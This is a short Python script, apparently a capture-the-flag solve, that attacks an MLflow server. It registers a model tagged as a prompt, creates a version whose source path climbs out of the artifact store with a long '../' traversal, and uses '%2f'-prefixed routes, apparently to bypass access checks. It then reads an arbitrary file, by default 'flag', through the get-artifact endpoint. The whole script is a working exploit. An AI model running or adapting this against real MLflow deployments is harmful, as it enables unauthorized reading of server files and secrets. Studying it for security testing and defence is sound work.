#!/usr/bin/env python3
import json
import sys
import urllib.error
import urllib.request

base = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080").rstrip("/")
flag_path = sys.argv[2] if len(sys.argv) > 2 else "flag"

name = "solve"
prompt = [{"key": "mlflow.prompt.is_prompt", "value": "true"}]


def api(path, body=None):
    req = urllib.request.Request(
        base + path,
        data=None if body is None else json.dumps(body).encode(),
        headers={"Content-Type": "application/json"},
        method="GET" if body is None else "POST",
    )
    try:
        return urllib.request.urlopen(req).read().decode()
    except urllib.error.HTTPError as e:
        return e.read().decode()


api("/%2fapi/2.0/mlflow/registered-models/create", {"name": name, "tags": prompt})
api("/%2fapi/2.0/mlflow/model-versions/create",
    {"name": name, "source": "../" * 24, "tags": prompt})

print(api(f"/%2fmodel-versions/get-artifact?name={name}&version=1&path={flag_path}").strip())
